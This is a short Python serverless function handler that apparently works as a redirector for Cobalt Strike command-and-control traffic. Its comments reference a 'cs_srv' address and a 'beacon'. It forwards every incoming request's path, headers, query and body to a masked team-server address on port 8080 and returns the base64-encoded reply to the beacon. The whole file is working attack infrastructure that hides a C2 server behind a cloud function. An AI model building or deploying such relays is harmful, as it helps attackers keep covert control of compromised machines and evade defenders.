# -*- coding: utf8 -*-
import base64
from requests import Session

# debug
proxies = {
    
}

sess = Session()

def main_handler(event, context):

    cs_srv_addr     =   'http://*.*.*.*:8080/release'
    http_path       =   event['path']
    http_headers    =   event['headers']
    http_query      =   event['queryString']
    http_method     =   event['httpMethod']
    http_body       =   event['body']   if 'body' in event.keys() else None
    http_timeout    =   20

    # remove host header
    del http_headers['host']
    
    # forward request
    resp = sess.request(method  =   http_method,
                        url     =   cs_srv_addr + http_path,
                        headers =   http_headers,
                        data    =   http_body.encode()  if http_body else None,
                        params  =   http_query,
                        timeout =   http_timeout)
    
    # response to beacon
    rt = {  'isBase64Encoded': True,
            'statusCode': resp.status_code,
            'headers': dict(resp.headers),
            'body': base64.b64encode(resp.content).decode()}

    return rt